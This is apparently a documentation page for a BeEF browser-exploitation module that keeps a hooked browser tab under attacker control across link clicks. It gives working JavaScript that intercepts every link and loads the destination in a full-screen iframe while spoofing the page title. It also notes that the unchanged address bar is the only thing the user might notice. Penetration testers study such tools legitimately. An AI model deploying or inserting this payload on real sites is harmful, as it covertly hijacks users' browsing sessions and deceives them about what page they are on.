## Summary

* **Objective**: Persists the hooked page across link clicks
* **Authors**: passbe
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/persistence/iframe_above)

## Internal Working

The idea is hook event listeners onto every link on the page so that when a link is clicked on, it replaces the current page with a 100% by 100% iFrame to the new web page. 

Thus the link on the top bar does NOT change (this user might notice this), but the browser tab is still hooked.

When a link is clicked on once, the new links inside the created iFrame are not replaced. This this module might need to be ran again on the same browser if the same result is to be achieved persistently.

```js
    persistentIframe: function(){
        $j('a').click(function(e) {
            if ($j(this).attr('href') != '')
            {
                e.preventDefault();
                beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
                $j(document).attr('title', $j(this).html());
                document.body.scroll = "no";
                document.documentElement.style.overflow = 'hidden';
            }
        });
    },
```

## Feedback

Sometimes it messes with the look of the redirected page (element sizes might appear larger than usual)
